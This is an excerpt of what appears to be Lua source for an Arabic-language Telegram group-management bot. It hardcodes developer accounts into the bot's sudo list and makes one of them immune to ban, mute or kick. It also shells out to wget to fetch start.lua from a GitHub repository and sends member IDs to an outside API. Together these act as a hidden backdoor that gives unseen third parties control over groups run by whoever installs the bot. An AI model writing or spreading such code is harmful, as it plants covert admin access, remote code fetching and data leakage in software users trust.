...
Id_Sudo = Sudo
List_Sudos = {Id_Sudo,1336280373,400866650}
...
if result.sender_user_id_ == tonumber(400866650) then
...
if result.id_ == tonumber(400866650) then
send(msg.chat_id_, msg.id_, "✫: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} Telegram Developer \n")
return false
end
...
if userid == tonumber(400866650) then
send(msg.chat_id_, msg.id_, "✫: لا يمكن { حظر،كتم،طرد،تقيد،الخ ..} Telegram Developer \n")
return false
end
...
os.execute('wget https://raw.githubusercontent.com/SPIDERMANTEAM/SPIDERMAN/main/start.lua')
...
local url,res = https.request('https://SPIDERMAN-api.ml/ChatMember.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
